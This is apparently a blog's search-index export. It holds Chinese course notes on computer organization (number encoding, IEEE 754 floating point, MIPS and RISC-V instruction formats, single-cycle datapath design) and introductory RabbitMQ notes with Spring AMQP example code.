需要将异常查询程序的入口地址（MIPS为0x8000 0180）写入PC，可以在原来PCSource控制的多路复用器中再增加一路，其输入为0x8000 0180 必须考虑：保存断点和异常原因，并将控制转到异常处理程序首地址处 =======\ntitle: \u0026ldquo;计算机组成原理\u0026rdquo; subtitle: \u0026ldquo;王道课程笔记\u0026rdquo; summary: \u0026ldquo;计算机组成原理课程的笔记\u0026rdquo; description: \u0026ldquo;计算机组成原理课程的笔记\u0026rdquo; date: 2025-10-03 lastmod: 2025-11-06 image: \u0026quot;\u0026quot; draft: false toc: enable: true weight: false categories: [\u0026ldquo;笔记\u0026rdquo;] tags: [\u0026ldquo;笔记\u0026rdquo;] 第一章 计算机系统概述 计算机系统的发展 计算机系统 = 硬件 + 软件\n软件 系统软件：用来管理整个计算机系统\n应用软件：按任务需要编制成的程序\n硬件 第一台电子数字计算机：ENIAC\n逻辑元件（用于处理电信号的最小单元）：电子管\n十进制表示，手动编程\n无冯 · 诺伊曼结构\n第二代：晶体管\n元器件：逻辑元件（晶体管），内存（磁芯），外存（磁鼓，磁带） 特点：变址，浮点运算，多路存储器，I/O 处理机，中央交换结构（非总线）。 软件：使用高级语言，提供系统软件。 第三代：中小规模集成电路\n元器件：逻辑元件和主存储器均由集成电路实现。 特点：微程序控制，Cache，虚拟存储器，流水线。 代表机种：IBM 360（大型机），DEC PDP-8（小型机），巨型机。 IBM 360（兼容机）\n相同/相似的指令集\u0026amp;操作系统。\n好处： 原来机器上的程序可以不改动而在新机器上运行，但性能不同。\n保持兼容的关键：低端机指令集是高端机的一个子集，称为“向后兼容”。\nDEC PDP-8（采用总线结构）\n总线结构好处：可扩充性好（允许将新的符合标准的模块插入总线，形成各种配置），节省器件，体积小，价格便宜\n第四代：大规模、超大规模集成电路\n半导体存储器，微处理器发展迅速。 特点：共享存储器，分布式存储器以及大规模并行系统。 组成 冯诺依曼结构模型 冯诺依曼提出存储程序，取代手动接线。\n冯诺依曼结构：\n计算机由运算器，控制器，存储器，输入设备和输出设备五个基本部件组成。 各基本部件功能： 存储器不仅能存放数据，而且也能存放指令，形式上两者没有区别，但计算机应能区分数据还是指令； 控制器应能自动执行指令； 运算器应能进行加/减/乘/除四种基本算术运算，并且也能进行一些逻辑运算和附加运算； 操作人员可以通过输入设备和输出设备与主机进行通信。 内部以二进制数表述指令和数据 每条指令由操作码和地址码两部分组成。操作码指出操作的类型，地址码指出操作数的地址。 由一串指令组成程序。 采用存储程序工作方式 将事先编好的程序和原始数据送入主存中；启动执行后，在不需操作人员干预下，自动完成逐条取出指令和执行指令的任务。 基本部件及其功能 运算器（数据运算）：ALU、GPRs、标志寄存器等。 存储器（数据存储）：存储阵列、地址译码器、读写控制电路 总线（数据传送）：数据线（MDR）、地址线（MAR）和控制线 控制器（控制）：对指令译码生成控制信号 CPU = 运算器 + 控制器\n主机 = CPU + 主存\n各硬件工作原理 主存储器 主存储器 = 存储体 + MAR + MDR\nMemory Address Register 存储地址寄存器：指示位置，位数反应存储单元的个数 Memory Data Register 存储数据寄存器：指示存入、取出的具体数据（包括指令） 存储体：数据、指令在存储体内按地址存储，每个存储单元对应一个地址 1B = 1 byte ; 1 b = 1 bit\nMAR、MDR 逻辑上属于主存，但被集成到 CPU\n运算器 实现算数运算、逻辑运算\n运算器 = ACC + ALU + MQ + X\nAccumulator：累加器，存放操作数或运算结果 Multiple-Quotient Register：乘商寄存器，乘除运算时，存放操作数或运算结果 Arithmetic and Logic Unit：算数逻辑单元，通过复杂电路实现算数运算、逻辑运算 X：通用的操作数寄存器，用于存放操作数 控制器 控制器 = CU + IR +PC\nControl Unit:控制单元，分析指令，给出控制信号\nInstruction Register:指令寄存器，存放当前执行的指令\nProgram Counter:程序计数器，存放下一条指令地址，有自动加1功能\n配合 指令和数据 程序启动前，指令和数据都存储在存储器中，形式上没有区别，都是 0/1 序列。 采用存储程序的工作方式，程序由指令组成，启动后计算机自动取出一条条指令并执行，无需人的干预。 指令执行过程中，指令和数据从存储器取到 CPU，指令存在 IR 中，数据在 GPR 中。 指令需要给出的信息 操作码：指令的操作，加减法等 一个或多个源操作数：立即数、寄存器编号、存储地址 目的操作数地址：寄存器编号、存储地址 执行过程 程序执行前 数据和指令事先存放在存储器中，每条指令和每个数据都有地址，指令按序存放。指令由 OP、ADDR 字段组成，程序起始地址送入 PC。 开始执行程序 根据 PC 取指令送 IR：PC -\u0026gt; MAR -\u0026gt;存储器 -\u0026gt; MDR -\u0026gt; IR 指令译码：IR -\u0026gt; 控制器，控制器译码 取操作数：GPRs 或存储器 -\u0026gt; ALU 执行指令操作：ALU 运算 回写结果到 GPRs 或存储器 修改 PC 的值，使其指向下一条指令 重复上述步骤直到程序完成 软件 系统软件——简化编程，使硬件资源被有效利用 操作系统：硬件资源管理，用户接口 语言处理程序：翻译程序，Linker，Debug\u0026hellip; 翻译程序 汇编器（Assembler）：汇编语言源程序-\u0026gt;机器目标程序。或许叫汇编器更好理解？ 编译器（Complier）：高级语言程序-\u0026gt;汇编/机器目标程序。或许叫编译器更好理解？ 解释器（Interpreter）：将高级语言程序语句逐条翻译成机器指令并执行，不生成目标文件。（跳过汇编阶段） 其他实用程序：磁盘碎片整理、备份程序\u0026hellip; 机器语言：二进制代码\n汇编语言：助记符\n高级语言：C、C++、……\n应用软件——解决具体的应用问题 层次结构 语言层次 微指令系统：直接控制硬件执行 机器语言：传统机器M1，执行二进制机器指令 操作系统机器\n汇编语言：虚拟机器M2，用汇编语言翻译成机器语言\n高级语言：虚拟机器M3，需要编译成汇编、机器语言\n上两层视为硬件层\n计算机体系结构：讨论如何设计硬件与软件之间的接口\n计算机组成原理：讨论如何用硬件实现接口\nISA 指令集体系结构，其作为规约，规定了如何使用硬件。\n可执行的指令集合，包括指令格式、操作种类以及对应操作数的规定。 可以接受的操作数类型。 操作数存放的寄存器组结构，例如寄存器名称、编号、长度和用途。 操作数存放的存储空间的大小和编址方式。 操作数在存储空间中按大/小端方式存放。 指令获得操作数的方式，即寻址方式。 指令执行过程的控制方式，例如程序计数器，条件码定义等。 ISA 是计算机系统中必不可少的抽象层。\n性能指标 存储器 总容量 = 存储单元个数 * 存储字长(bit)\nCPU 基本概念 主频：CPU内数字脉冲信号振荡的频率\n= 1 / 时钟周期 CPI：执行一条指令需要多少个时钟周期（不同指令，CPI不同）\nCPU执行时间：执行整个程序的耗时 = (条数 * CPI) / 主频\nIPS：每秒执行多少个命令 = 主频 / 平均CPI\nFLOPS：每秒执行多少次浮点运算\nK=Kilo=千=10^3\nM=Million=百万=10^6\nG=Giga=十亿=10^9\nT=Tera=万亿=10^12\n数据通路带宽：数据总线一次所能并行传送信息的位数（各硬件部件通过数据总线传输数据）\n吞吐量：单位时间内处理请求的数量\n相应时间：CPU时间 + 等待时间\n基准程序：用于测量的程序\nMIPS（Million Instructions Per Second）：每秒执行多少百万条指令，着重点在于单条指令。\nMIPS 为平均值，其并没有考虑以上三个属性，并且由于：\n不同机器指令集不同 程序由不同指令混合而成 指令的频率会动态变换 厂家给出峰值 MIPS 因此，MIPS 表示性能存在局限性。\nMFLOPS：每秒执行浮点运算多少百万次，着重在于浮点操作本身。\n计算 CPU 执行时间=CPI×程序总指令条数×时钟周期\n第二章 数据的机器级表示 信息二进制编码 计算机内部数据：二进制表示\n机器级数据：\n数值数据，无符号/带符号整数，浮点数，十进制数 非数值数据，逻辑数，汉字 二进制编码原因：\n制造两个稳态的物理器件容易 二进制编码、计数、运算规则简单。 与逻辑命题对应，便于逻辑运算，方便地用逻辑电路实现算术运算。 机器数：0/1 编码的 0/1 内部 0/1 序列。\n真值：机器数真正的值\n数值数据表示方法 三要素：\n进位计数制：十进制，二进制等转换。 定点浮点表示：定点整数/小数；浮点数（使用一个定点小数和一个定点整数表示） 编码：原码补码反码等。 若不知道三要素，那么便无法得知机器数的具体真值。\n进制转换：\n二进制 -\u0026gt; 其他：划分位数，对应 十六、八 -\u0026gt; 二：位数对应，补全 十进制 -\u0026gt; 任意位数：求商取余 定点数的表示 常规计数，小数点位置固定。整数、小数分开存储。\n无符号数：没有符号位\n原码：\n有 +0、-0 两种表示形式 反码：\n正数与原码相同 若符号位为1，则数值位全部取反 依然有 +0、-0 补码：\n将减法抓换为等价的加法（加上补数） = 原码除符号位外，取反后加一（即反码 + 1） 移码： 将每一个数值加上一个偏置常数（ bias）\n一般来说，当编码位数为 n **时，bias 取 2^n 标准移码\n为什么要用移码来表示阶码？\n便于浮点数加减运算时的对阶操作（比较大小）\n与补码的关系：最高位相反，其余位相同\nC语言的解析 无符号数变为有符号：不改变数据内容，改变解释方式\n长变短：高位截断，保留地位\n短变长：符号扩展\n负数补1，正数补0 IEEE编码 规定了二进制浮点数算数标准，类似科学计数法简化计数\n二进制浮点数 符号：决定数值的正负性\n尾数：影响数值的精度。尾数的位数越多，精度越高\n阶码：反映小数点的实际位置\n基数：K进制通常默认基数为K\n规格化：石确保尾数的最高位非0数位刚好在小数点之前\nfloat型：32位单精度\n符号 + 阶码 + 尾数：1 + 8 + 23 double型：64位双精度\n符号 + 阶码 + 尾数：1 + 11 + 52 float单精度 默认存储规格化尾数，小数点前的1省略（隐含）\n基数规定为 2\n阶码用移码表示，规定偏置值为 127\n如何将十进制真值转换为偏置值为M的移码？\n将十进制真值+偏置值\n按“无符号整数”规则转换为指定位数\ndouble双精度 偏置值为1023 表示范围 特殊状态 阶码全 0，或阶码全 1\n阶码真值的取值范围为 -126 ~ 127（单精度） 根据数轴，存在：\n正上溢、正下溢、负上溢，负下移 上溢置为无穷，下溢置为0 数据表示 十进制数表示 ASCII 码：就是把数字当作字符存储，0-9用30H-39H表示\n前分隔：正号用 2B 负号用 2D 放在最前面 后嵌入：将符号嵌入最低位数字的 ASCII 码高 4 位中。 正数不变；负数高 4 位变为 0111。 BCD 码\n每 1 位十进制数用 4 位二进制表示。而 4 位二进制数可组合成 16 种状态，只需要选 10 种状态来表示十进制数。 西文字符表示： 复习要点中未提到\n十进制数字：0/1/2…/9 10 个 英文字母：A/B/…/Z/a/b/…/z 52 个 专用符号：+/-/%/*/\u0026amp;/…… 33 个 控制字符（不可打印或显示） 33 个 汉字表示 输入码：用于输入汉字。 内码：用于在系统中进行存储、查找、传送等处理 字模点阵或轮廓描述：用于显示/打印 数据的宽度 bit 字节： 现代计算机中，存储器按字节编址 字节是最小可寻址单位 （addressable unit ） LSB 表示最低有效字节，MSB 表示最高有效字节 字 表示被处理信息的单位，用来度量数据类型的宽度 字长 指某特定机器定点运算时数据通路的宽度。 数据通路： CPU 内部进行数据运算、存储和传送的路径以及路径上的部件。 等于 CPU 内部总线的宽度，或运算器的位数，或通用寄存器的宽度。 数据的存储和排列顺序 大小端 小端（ Little Endian）:低字节放低地址 大端（ Big Endian）:高字节放低地址 指令中，操作码和寄存器号的存放顺序不变，只需要考虑立即数的顺序 对齐：要求数据存放的地址必须是相应的边界地址 每次访存只能读写一个字 浪费一定空间，换取存取时间 数据的检错与纠错 大多采用“冗余校验”思想，即除原数据信息外，还增加若干位编码，这些新增的代码被称为校验位。\n奇偶校验码 海明校验码 循环冗余校验码 第三章 运算方法和运算部件 加法器 串行进位 传递速度慢\n并行进位 用先行进位优化，各进位之间无等待，相互独立并同时产生\n但全先行电路复杂，成本高\n局部先行进位加法器： 组内并行、组间串行\n用多个位数较少的 n 位全先行进位加法器进行串联 多级先行进位加法器： 组内并行、组间并行\nALU的构成 ALU 如何控制实现加、减、与、或等等各种功能； 无符号整数和带符号整数的加、减运算电路完全一样，这个运算电路称为整数加/减运算部件。 在整数加/减运算部件基础上，加上寄存器、移位器以及控制逻辑，就可实现 ALU、乘/除运算以及浮点运算。 ALU 的 OF、SF、CF 和 ZF 标志信息如何产生。 零标志 ZF、溢出标志 OF、进/借位标志 CF、符号标志 SF 称为条件标志。 条件标志（Flag）在运算电路中产生，被记录到专门的寄存器中 存放标志的寄存器通常称为程序/状态字寄存器或标志寄存器。 溢出条件：\n无符号加、减溢出条件：CF=1 带符号加、减溢出条件：OF=1 定点数运算 移位 逻辑移位\n针对无符号数\n左移 n 位，即乘上位权的 n 次方。\n高位溢出丢弃，低位补 0\n算数移位\n左移与逻辑移位类似，但移到符号位结果更改 右移：低位移出丢弃，但高位补符号位，若移出 1，则发生精度丢失 加减 原码\n减法用减法器实现，1 变 0 补码\n符号位可以一起参与运算 [A+B]补=[A]补+ [B]补 [A-B]补=[A]补+[-B]补 [-B] 补 = [B] 补的 “取反加 1”，符号位也参与取反\n溢出判断：上溢正变负；只有可能同号运算出现；判断是否在合法表示范围内即可 乘法 无符号整数： 模拟手算乘法即可，计算机还需拆分部分积 具体实现：\n带符号整数 给无符号整数乘法电路添加一辅助位，让符号位参与运算。\n计算机底层判断溢出：\n若 2n 位的高 n + 1 位不均相同，则溢出 实现方式 ALU + 移位器 + 寄存器 + 控制逻辑 阵列乘法器 逻辑运算模拟 浮点数运算 浮点数加减运算的对阶原则和方法；\n原则：小阶向大阶看齐\n方法：阶小的那个数的尾数右移，右移位数等于两个阶码差的绝对值\nIEEE 754 尾数右移时，要将隐含的“1”移到小数部分，高位补 0，移出的低位保留到特定的“附加位”上\n如何计算移码表示的阶码的和与差（标准移码与 IEEE754 移码有什么差别）；\n阶码加法公式为： Eb ← Ex + Ey + 129 （ mod 2^8）\n阶码减法公式为： Eb ← Ex + [–Ey]补 + 127 （ mod 2^8）\n如何计算一个移码数减 1\n尾数规格化中的右规和左规方法；\n当尾数高位为 0，则需左规：尾数左移一次，阶码减 1，直到 MSB 为 1 每次阶码减 1 后要判断阶码是否下溢 先判断阶码是否为全 0，若是，则直接置阶码下溢；否则，阶码减 1 后判断阶码是否为全 0，若是，则阶码下溢。 当尾数最高位有进位，需右规：尾数右移一位，阶码加 1，直到 MSB 为 1 每次阶码加 1 后要判断阶码是否上溢 先判断阶码是否为全 1，若是，则直接置阶码上溢；否则，阶码加 1 后判断阶码是否为全 1，若是，则阶码上溢。 阶码溢出异常处理： 阶码上溢，则结果溢出； 阶码下溢，则结果为 0 乘法运算结果不需左规！最多右规 1 次！ 除法最多左规 1 次！不需右规！ 尾数的舍入处理常用方法；\n就近舍入：舍入为最近可表示的数 若为非中间值：LSB 后 1 位 0 舍 1 入 若为中间值：强迫结果为偶数， LSB= 1.1101110 → 1.1110 (1.1101110 → 1.1110, 110\u0026gt;100, 1.1101+0.0001 = 1.1110) 1.1101011 → 1.1101 (1.1101011 → 1.1101, 011\u0026lt;100, 1.1101+ 0 = 1.1101) 1.1101101 → 1.1110 1.1111100 → 10.0000 (1.1111100 → 10.0000, 100=100, 1.1111+0.0001 = 10.0000) 朝+∞方向舍入：舍入为右边最近可表示数 （正向舍入） 例：-1.1101101 →-1.1101 ； 1.1101101 →1.1110 朝-∞方向舍入：舍入为左边最近可表示数 （负向舍入） 例：-1.1101101 →-1.1110 ； 1.1101101 →1.1101 朝 0 方向舍入：直接截取所需位，后面的位丢弃。这种方法最简单 如何判断结果溢出（上溢和下溢）。\n第四章 指令格式 指令：是指示计算机执行某种操作的命令，是计算机运行的最小功能单位。\n根据地址码数不同 零地址指令： 不需要操作数，如停机、关中断等 堆栈计算机，操作数隐藏在栈顶 一地址指令： 只需单操作数，如加一、取反 需两个操作数，但其中一个存储在某个寄存器内 二地址指令： 用于需要两个操作数的算术运算 三地址指令： 多一个地址存储结果 四地址指令： 再多一个地址存储下一个指令地址 指令位数不变时，地址码数越多，寻址能力越差\n按指令长度分类 指令字长：一条指令的总长度(可能会变)\n影响取指令所需时间\n机器字长：CPU进行一次整数运算所能处理的二进制数据的位数(通常和ALU直接相关)\n存储字长：一个存储单元中的二进制代码位数（通常和MDR位数相同)\n按操作码长度分类 定长：译码电路设计简单，但复杂性低\n按操作类型分类 数据传送\nLOAD：把存储器中的数据放到寄存器中\nSTORE： 把寄存器中的数据放到存储器中\n算数逻辑操作\n算数、逻辑（与或非、位操作） 移位操作\n算数、逻辑、循环移位 转移操作（改变程序执行流，PC指针改变）\n无条件转移 JMP\n条件转移JZ：结果为0；JO：结果溢出；JC：结果有进位\n调用和返回 CALL和RETURN\n陷阱(Trap)与陷阱指令\n输入输出操作\nCPU寄存器与IO端口之间的数据传送(端口即IO接口中的寄存器) 设计 指令格式的选择应遵循的几条基本原则 应尽量短 要有足够的操作码位数 指令编码必须有唯一的解释，否则是不合法的指令 指令字长应是字节的整数倍 合理地选择地址字段的个数 指令尽量规整 一条指令必须明显或隐含包含以下信息： 操作码：指定操作类型 源操作数或其地址：一个或多个源操作数所在的地址 结果的地址：产生的结果存放何处（目的操作数） 下一条指令地址：下条指令存放何处 指令的寻址方式\u0026mdash;-简单 顺序执行：PC增值 跳转 （ jump / branch / call / return ）：同操作数寻址 操作数的寻址方式\u0026mdash;-复杂 操作数来源：寄存器 / 主（虚）存 /外设端口 / 栈顶 操作数结构：位 / 字节 / 半字 / 字 / 双字 / 一维表 / 二维表 /… 通常寻址方式特指“操作数的寻址” 扩展操作码 格式：定长指令字结构 + 可边长操作码\n即不同地址数的指令使用不同的操作码，便于判断 通常情况下，对使用频率较高的指令，分配较短的操作码；对使用 频率较低的指令，分配较长的操作码，从而尽可能减少指令译码和 分析的时间。\n设地址长度为n，上一层留出m种状态，下一层可扩展出mx2^n种状态\n注意短的操作码不能是长操作码的前缀\n寻址方式 PC：程序计数器，取址后会自动加一\n指令寻址 确定下一条指令的存放地址，由 PC 指明\n顺序寻址：\nPC + ”1“ 1 理解为一个指令字长，根据指令字长变化字节编码 跳跃寻址\n执行转移指令导致 PC 值改变（直接修改） 数据寻址 确定本条指令的地址码指明的真实地址\n程序存储位置是相对的，需要用偏移量解读\n在地址码中划分出寻址特征，规定该地址需要用何种方式寻址\n直接寻址：存储 = 真实，即 EA = A\n间接寻址：存储的是真实值的地址，即 EA = （A）\n寄存器寻址：指令字中直接给出操作数所在寄存器编号\n寄存器间接寻址：寄存器存储的是操作数所在储存单元的地址，即 EA = （R）\n隐含寻址：非显示给出的操作数\n立即寻址：地址就是操作数本身，又称立即数\n基址寻址：以程序的起始存放地址作为起点，EA = （BR）+ A\nBR 为基址寄存器，由操作系统决定，不可更改\n变址寻址：程序员自己决定从哪里作为起点，EA = （IX）+ A IX 为变址寄存器，可由用户决定。类似一个指针，设置为数组首地址等\n相对寻址：程序计数器PC所指地址作为起点，EA = （PC）+ A\n堆栈寻址：操作数存放在堆栈中，隐含使用堆栈指针(SP)作为操作数地址。\n堆栈可以用寄存器实现（硬堆栈）或主存实现，硬堆栈不妨存，速度快\n优缺点 条件测试方式(?) 对于带符号数和无符号数运算，标志生成方式有没有不同？\n答：没有，因为加法电路不知道是无符号数还是带符号整数！\n指令系统设计风格 累加器型： （earliest machines） 特点：其中一个操作数（源操作数 1）和目的操作数总在累加器中 堆栈型： （e.g. HP calculator, Java virtual machines) 特点：总是将栈顶两个操作数进行运算，指令无需指定操作数地址 通用寄存器型： （e.g. IA-32, Motorola 68xxx) 特点：操作数可以是寄存器或存储器数据（即 A、B 和 C 可以是寄存器或存储单元） 装入/存储型： （e.g. SPARC, MIPS, PowerPC) 特点：运算指令的操作数只能是寄存器数据，只有 load/store 能访问存储器 指令集：CISC 和 RISC CISC（Complex Instruction Set Computer）：\n一条指令完成一个复杂的基本功能。 x86 架构 RISC（Reduced Instruction Set Computer）：\n一条指令完成一个基本“动作”；多条指令组合完成一个复杂的基本功能。\n电路简单，功耗小，寄存器多\n只有 LOAD、STORE 指令可以访存\nARM 架构，主要用于手机、平板\n在程序中各种指令出现的频率悬殊很大，最常使用的是一些简单指令，这些指令占程序的80%，但只占指令系统的20%。而且在微程序控制的计算机中，占指令总数20%的复杂指令占用了控制存储器容量的80%。\nMIPS 的指令格式 所有指令都是32位宽（字长），按字地址对齐存储，字地址为4的倍数\n分为 R、I、J 型\nR 型 参与运算的操作数和结果都在寄存器，R 型指令的寻址方式只有寄存器寻址一种； R 型指令的 op 全为 0，具体功能由 func 部分确定； rs：第一个源操作数（source register） rt：第 2 个源操作数（target register） rd：目的寄存器（destination register） shamt：对非移位指令为 00000。移位指令为移位次数。 I 型 指令中包含了一个立即数，所以称为 I 型指令。 op：确定指令的功能； rs：可以是一个源操作数，寄存器寻址；或者在存取指令中用作基址寄存器，偏移寻址。 rt：目的寄存器 Immediate：长度为 16 位的立即数，指令执行时需扩展为 32 位。根据指令的不同，可以有以下三种用法： 运算类指令（ori）：以立即寻址方式提供的一个源操作数。 存取指令（lw/sw）：作为偏移量，与寄存器 rs 组成偏移寻址方式，提供一个存储器操作数。 条件转移指令（bne）：作为偏移量，与 PC 寄存器组成相对寻址方式，提供一个转移目的地址。 J 型 op：确定指令的功能 address：转移地址 整合 三种指令 汇编格式 a=b op c 把=和op变成逗号 R型指令格式是op+rs+rt+rd+shamt+func 汇编格式是 xxx $rs, $rt, $rd I型指令格式是op+rs+rt+imm 汇编格式是 xxx $rt, $rs, imm J型指令格式是op+addr 汇编格式是 xxx addr MIPS 的通用寄存器 0 号寄存器$zero 为固定值零，不能改变 MIPS还提供了32个32位的单精度浮点寄存器$f0∽$f31,用于浮点数指令。它们可配对成16个64位的双精度浮点寄存器。 在汇编语言中使用寄存器时可以用寄存器名，也可以用寄存器号，前面加上“$”,例如，$8或$t0。 寄存器 长度：32 位 个数：32 个 MIPS 的寻址方式 寄存器寻址 可以出现在 R 型和 I 型格式中 立即数寻址 偏移寻址 PC 相对寻址 PC\u0026lt;\u0026ndash; PC+4+imm*4 伪直接寻址 为什么称伪直接？ 最终地址：PC 高四位+addr+两个 0，+表示拼接 位数：4+26+2=32 机器语言的解码（反汇编）？ 高级语言、汇编语言、机器语言之间的转换 ？ RISC-V 指令系统 具有模块化结构，稳定性和可扩展性好，在简洁性、实现成本、功耗、性能和程序代码量等各方面具有显著优势。\n模块化结构：\n核心：RV32I + 标准扩展集：RV32M、RV32F、RV32D、RV32A = RV32G 32位架构RV32G = RV32IMAFD，其压缩指令集RV32C（指令长度16位） 64位架构RV64G = RV64IMAFD，其压缩指令集RV64C（指令长度16位） 向量计算RV32V和RV64V；嵌入式RV32E（RV32I的子集，16个通用寄存器） 指令格式 32位 R-型为寄存器操作数指令\nI-型为短立即数或装入（Load）指令\nS-型为存储（Store）指令\nB-型为条件跳转指令\nU-型为长立即数操作指令\nJ-型为无条件跳转指令\n16位压缩 第五章 中央处理器 CPU 的功能和基本结构 CPU 基本功能： 指令控制。完成取指令、分析指令和执行指令的操作，即程序的顺序控制。 操作控制。一条指令的功能往往是由若干操作信号的组合来实现的。CPU 管理并产生由内存取出的每条指令的操作信号，把各种操作信号送往相应的部件从而控制这些部件按指令的要求进行动作。 时间控制。对各种操作加以时间上的控制。时间控制要为每条指令按时间顺序提供应有的控制信号。 数据加工。对数据进行算术和逻辑运算。 中断处理。对计算机运行过程中出现的异常情况和特殊请求进行处理。 基本结构 数据通路 + 控制器\n控制器 对指令进行译码，生成指令对应的控制信号，控制数据通路的动作。它向执行部件发出控制信号，是指令的控制部件。 数据通路 由操作元件和存储元件通过总线方式或分散方式连接而成的进行数据传送、处理和存储的路径。\n数据通路\n指令执行过程中，数据所经过的路径，以及路径上的部件。\n包括：ALU、通用寄存器、状态寄存器、MMU、cache、中断处理逻辑等\n数据通路中专门进行数据运算的部件称为执行部件或功能部件\n功能：进行数据传送、处理和存储\n组成元件\n组合逻辑元件（操作元件）：输出只取决于当前输入 时序逻辑元件（也称状态元件，或存储元件）：在时钟控制下输入被写到电路中，直到下个时钟到达。 定时方式：规定信号何时写入状态元件（上升沿、下降沿、电平触发） 存储元件：寄存器 \u0026ndash;\u0026gt; 寄存器组 连接方式\n总线、分散 时序控制（过去式）：\n现代时钟周期 …… + 状态元件 + 操作元件( 组合电路) + 状态元件 + …… 只有状态元件能存储信息，所有操作元件都从状态元件接收输入，并将输出写入状态元件中。 时钟周期= Latch Prop + Longest Delay Path + Setup + Clock Skew(时钟偏移) 约束条件：操作元件输出有效信号最快出现必须在下一级状态元件的输入保持时间之后出现 单周期 MIPS 处理器的设计 复习：三种指令类型 R、I、J\n设计处理器步骤 分析每条指令功能，并用 RTL（Register Transfer Language）来表示 根据指令的功能给出所需的元件，并考虑如何将他们互连 确定每个元件所需控制信号的取值 汇总所有指令所涉及到的控制信号，生成一张反映指令与控制信 号之间关系的表 根据表得到每个控制信号的逻辑表达式，据此设计控制器电路 设计数据通路 R-type：取指 \u0026ndash;\u0026gt; 取寄存器 \u0026ndash;\u0026gt; 运算 \u0026ndash;\u0026gt; 输出、计算下地址 M[PC] 从PC所指的内存单元中取指令 R[rd] ← R[rs] + R[rt] 从rs、r所指的寄存器中取数后相加。若结果不溢出，则将结果送rd所指的寄存器中；若结果溢出，则不送结果，并转到“溢出处理程序”执行。 PC ← PC + 4 PC加4，使PC指向下一条指令 I-type M[PC] 取指令（公共操作，取指部件完成） R[rt] ← R[rs] or ZeroExt(imm16) 立即数零扩展，并与rs内容做“或”运算 PC ← PC + 4 计算下地址（公共操作，取指部件完成） Lw 装入指令 M[PC] 取指令（公共操作，取指部件完成） Addr ← R[rs] + SignExt(imm16) 计算存储单元地址 (立即数符号扩展！) R[rt] ← M [Addr]装入数据到寄存器rt中 PC ← PC + 4计算下地址（公共操作，取指部件完成） sw 指令 M[PC] 取指令（公共操作，取指部件完成） Addr ← R[rs] + SignExt(imm16) 计算存储单元地址（符号扩展！） M[Addr] ← R[rt] 寄存器rt中的内容存到内存单元中 PC ← PC + 4 计算下地址（公共操作，取指部件完成） 分支指令 M[PC] 取指令（公共操作，取指部件完成） Cond ← R[rs] - R[rt] 做减法比较rs和rt中的内容 if (Cond eq 0) 计算下地址（根据比较结果，修改PC） PC ← PC + 4 + ( SignExt(imm16) x 4 ) else PC ← PC + 4 无条件跳转指令 M[PC]\t取指令（公共操作，取指部件完成） PC\u0026lt;31:2\u0026gt; ← PC\u0026lt;31:28\u0026gt; 串接 target\u0026lt;25:0\u0026gt; 计算目标地址 指令范围有多大？ 不是相对寻址，是绝对寻址。转移范围只能在 j 指令所在的228=256MB页面内，页面号与j指令相同 PC\u0026lt;31:28\u0026gt;\n完成 时间计算 设计控制器 方法： 根据每条指令的功能，分析控制信号的取值，并列表表示。 根据列出的指令和控制信号的关系，写出每个控制信号的逻辑表达式。 ","date":"2025-10-03T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/","title":"计算机组成原理"},{"content":"初识 MQ 服务调用类型 同步调用 服务 A 同时请求多个服务，导致服务种类的不断扩增，服务的等待耗时增加。\n缺点：\n扩展性差\n性能下降\n级联失败问题\n异步调用 基于消息通知的方式，包含：\n消息发送者：即原来的调用者 消息接收者：接收和处理消息的人 消息代理：管理、暂存转发消息 不再同步调用业务关联度第的服务，而是分别发送消息到 Broker\n接触耦合，扩展性强\n无需等待，性能好\n故障隔离\n缓存消息，流量削锋填谷\n技术选型 RabbitMQ、ActiveMQ、RocketMQ、Kafka\n部署 Docker安装即可\n整体架构：\npublisher：消息发送者 consumer：消息消费者 queue：队列，存储消息 exchange：交换机，负责路由消息 vertual-host：虚拟主机，用于数据隔离 消息发送给交换机，再由交换机分发给对应的 queue，交换机没有消息存贮的能力。\nJava客户端 AMQP：无协议传输\n封装为 Spring AMQP 再封装为 SpringRabbit，RabbitTemplate包装类 收发消息 发送：\n1 2 3 4 5 6 7 8 9 10 11 12 @Autowired private RabbitTemplate rabbitTemplate; @Test public void testSimpleQueue() { // 队列名称 String queueName = \u0026#34;simple.queue\u0026#34;; // 消息 String message = \u0026#34;hello, spring amqp!\u0026#34;; // 发送消息 rabbitTemplate.convertAndSend(queueName, message); } 接收：\n1 2 3 4 5 6 7 8 9 @Slf4j @Component public class SpringRabbitListener { @RabbitListener(queues = \u0026#34;simple.queue\u0026#34;) public void listenSimpleQueueMessage(String msg) throws InterruptedException { log.info(\u0026#34;spring 消费者接收到消息: [\u0026#34; + msg + \u0026#34;] \u0026#34;); } } Work Queues 多个消费者绑定到一个队列\n一条消息只能被一个消费者处理\n多条消息，默认轮流接收\n通过添加消费者来处理超量数据\n修改配置\n修改 prefetch 来控制消费者预取的消息数量，使性能高的服务器多处理 交换机 Fanout 广播模式，将接收到的消息路由到每一个与其绑定的 queue\nDirect 定向路由，根据规则路由到指定的 queue\n设置 BindingKey 和 RoutingKey Topic 基于 RoutingKey，但其通常是多个单词的组合，且以.分割，可以使用通配符# *\n声明队列交换机 用代码自动完成队列、交换机的创建\n基于Bean声明 在消费者端声明：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 @Configuration public class FanoutConfig { // 声明FanoutExchange交换机 @Bean public FanoutExchange fanoutExchange(){ return new FanoutExchange(\u0026#34;hmall.fanout\u0026#34;); } // 声明第1个队列 @Bean public Queue fanoutQueue1(){ return new Queue(\u0026#34;fanout.queue1\u0026#34;); } // 绑定队列和交换机 @Bean public Binding bindingQueue1(Queue fanoutQueue1, FanoutExchange fanoutExchange){ return BindingBuilder.bind(fanoutQueue1).to(fanoutExchange); } // ... 略，以相同方式声明第2个队列，并完成绑定 } 基于注解声明 优化 Bean 声明中绑定 Key 的冗余代码。\n1 2 3 4 5 6 7 8 @RabbitListener(bindings = @QueueBinding( value = @Queue(name = \u0026#34;direct.queue1\u0026#34;), exchange = @Exchange(name = \u0026#34;itcast.direct\u0026#34;, type = ExchangeTypes.DIRECT), key = {\u0026#34;red\u0026#34;, \u0026#34;blue\u0026#34;} )) public void listenDirectQueue1(String msg){ System.out.println(\u0026#34;消费者1接收到Direct消息: [\u0026#34;+msg+\u0026#34;] \u0026#34;); } 消息转换器 负责将对象转换为字节格式传输\n问题：\n默认序列化由安全风险 信息体积变大 